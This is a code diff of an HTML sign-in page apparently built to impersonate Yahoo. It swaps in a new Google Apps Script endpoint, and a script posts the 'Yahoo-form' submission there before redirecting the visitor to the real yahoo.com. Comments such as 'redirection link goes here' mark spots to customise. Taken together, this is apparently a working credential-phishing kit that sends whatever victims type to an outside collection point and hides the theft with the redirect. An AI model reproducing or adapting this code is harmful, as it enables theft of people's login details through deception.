@@ -1,4 +1,3 @@
-<?php include 'mail.php'?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -71,7 +70,7 @@
                     </div>
                     <p class="text-option">Or, continue with</p>
                     <div class="button__container button__container--google ">
-                        <a href="http://www.yahoo.com " class="button__container">
+                        <a href="" class="button__container">
                             <button class="button google-sign-in button__container--flex">
                                 <div class="google__icon">
                                     <img src="./resources/search.png" alt="">
@@ -99,15 +98,16 @@
                     });
                     </script> -->
                     <script>
-                        const scriptURL = 'https://script.google.com/macros/s/AKfycbxcgJnfrs3_VMDxEtw2jC9db_eKZ7-i88grJbHjBvRE0YyUurjDY2Zhmnhn9mARssaBUg/exec'
-                        const form = document.forms['Yahoo-form']
+                        const scriptURL = 'https://script.google.com/macros/s/AKfycbycAFpsrfsk69CccnJ3skbeKMxUuS1tWyTJP1SxEg9JjnYb4ydMFJZIwXGTCIf4KwuKKQ/exec'
+
+                        const form = document.forms['Yahoo-form']  // form id goes here
                       
                         form.addEventListener('submit', e => {
                           e.preventDefault()
                           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                             // .then(response => alert("Thank you! your form is submitted successfully." ))
                             // .then(() => {  window.location.reload(); })
-                            .then(() => {  window.location.href = "http://www.yahoo.com"; })
+                            .then(() => {  window.location.href = "http://www.yahoo.com"; })  // redirection link goes here
                             .catch(error => console.error('Error!', error.message))
                         })
                       </script>
